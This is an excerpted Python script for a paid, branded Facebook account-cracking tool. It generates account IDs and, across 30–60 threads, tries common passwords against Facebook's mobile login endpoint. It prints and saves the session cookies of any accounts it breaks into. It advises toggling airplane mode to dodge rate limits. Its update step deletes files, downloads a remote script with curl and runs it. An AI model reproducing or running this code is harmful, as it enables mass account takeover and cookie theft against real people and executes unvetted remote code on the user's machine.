...
logo = """
HRIDOY CHOWDURY RAIHAN
--------------------------------------------------
[•]\033[1;32mCREATED BY     : \033[1;32mHRIDOY CHOWDURY RAIHAN\033[1;32m
[•]\033[1;32mFACEBOOK       : \033[1;32mHRIDOY CHOWDURY RAIHAN\033[1;32m
[•]\033[1;32mYOUTUBE        : \033[1;32mAr Online Technical Tips24\033[1;32m
[•]\033[1;32mSTATUS         : \033[1;32mPAID\033[1;32m
--------------------------------------------------
[•] \033[1;33mVERSION    :\033[1;32m 33.0 \033[1;32m"DON'T WORRY FOR UPDATES!"\033[1;32m
--------------------------------------------------"""
...
cps = []
try:
    print('\n\033[1;32m[•] WAIT CHECKING FOR UPDATE')
    proxy = requests.get('https://raw.githubusercontent.com/HRIDOY-CHOWDURY-RAIHAN/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/HRIDOY-CHOWDURY-RAIHAN/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/HRIDOY-CHOWDURY-RAIHAN/raihan/main/raihan.py > raihan.py')
        os.system('python raihan.py')
    else:pass
...
def hridoy():
	...
	if gh =='1':
		...
		os.system('xdg-open https://github.com/HRIDOY-CHOWDURY-RAIHAN')
	elif gh =='0':
...
def menu():
	...
	print('[2] raihan + KHAN PASS')
	print('[3] MraihanK + BALOCH PASS')
	...
	if opt =='1':
		...
		print('\n\033[1;37m[•] Choose vraihand option\033[0;97m')
		time.sleep(2)
		menu()
...
def raihan_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mraihan + KHAN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def mraihank_baloch():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMraihanK + BALOCH')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'mraihank123','mraihank1122','baloch786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).tex
            log_cookies=session.cookies.get_dict().keys()
           #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\033[1;32m[RAIHAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                # print('\033[1;33m[RAIHAN-CP] '+uid+' | '+ps+'\x1b[1;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mRAIHAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/HRIDOY-CHOWDURY-RAIHAN/Apr/blob/main/Apr.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://m.me/paglir.pagol.37853='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
